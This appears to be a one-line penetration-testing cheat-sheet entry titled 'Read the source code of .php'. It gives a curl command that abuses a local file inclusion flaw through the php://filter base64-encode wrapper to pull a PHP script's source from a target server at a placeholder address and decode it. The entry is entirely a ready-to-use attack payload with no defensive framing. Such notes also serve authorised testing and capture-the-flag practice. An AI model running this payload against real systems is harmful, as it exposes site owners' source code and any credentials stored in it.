
Read the source code of .php
```
curl -s 'http://<ip_addr>/<filename>.php?file=php://filter/convert.base64-encode/resource=secret-script.php' | base64 -d
```
